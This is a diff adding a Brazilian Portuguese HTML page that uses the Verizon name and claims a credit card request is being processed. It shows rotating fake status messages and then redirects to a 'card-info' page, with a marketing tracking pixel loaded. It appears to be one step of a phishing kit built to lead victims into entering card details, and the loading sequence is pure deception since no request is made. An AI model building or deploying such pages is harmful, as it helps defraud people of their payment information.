@@ -1,0 +1,103 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verizon - Faça seu Cartão</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="assets/style.css">
+    
+<script src="js/latest.js" async="" defer=""></script>
+
+<script>
+  window.pixelId = "66bb763debbcebab27d68442";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+    
+</head><body>
+    <link rel="stylesheet" href="css/style.css">
+    <style>
+        .main-content {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: azure;
+            color: #111;
+            text-align: center;
+            flex-direction: column;
+        }
+
+        .main-content {
+            max-width: 100%;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin: 0px auto !important;
+            border-radius: 0px !important;
+        }
+
+        .loading-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .spinner {
+            border: 4px solid #111;
+            border-radius: 50%;
+            border-top: 4px solid #FFE53B;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+
+    <div class="header">
+        <img style="width: 160px;" src="images/VfoPzxB.png" alt="Imagem Centralizada"> 
+    </div>
+
+    <div class="main-content">
+        <div id="loading-section" class="loading-section" style="display: flex;position: relative;top: -14rem;">
+            <div class="loading-content">
+                <div class="spinner"></div>
+                <p id="loading-text" style="font-size: 22px;">O cartão de Crédito está sendo solicitado...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function iniciarCarregamento() {
+            const frases = [
+                "O cartão de Crédito está sendo solicitado...",
+                "Aguarde a Resposta do Sistema.",
+                "Solicitação em Andamento."
+            ];
+            let fraseIndex = 0;
+            document.getElementById('loading-section').style.display = 'flex';
+            const fraseInterval = setInterval(() => {
+                if (fraseIndex < frases.length) {
+                    document.getElementById('loading-text').innerText = frases[fraseIndex];
+                    fraseIndex++;
+                } else {
+                    fraseIndex = 0; // Reinicia as frases para continuar o loop
+                }
+            }, 1000);
+            
+            setTimeout(() => {
+                clearInterval(fraseInterval);
+                window.location.href = '../8-card-info/index.php'; // Substitua pela URL desejada
+            }, 6000);
+        }
+
+        // Iniciar o carregamento ao carregar a seção
+        iniciarCarregamento();
+    </script>
+</body></html>
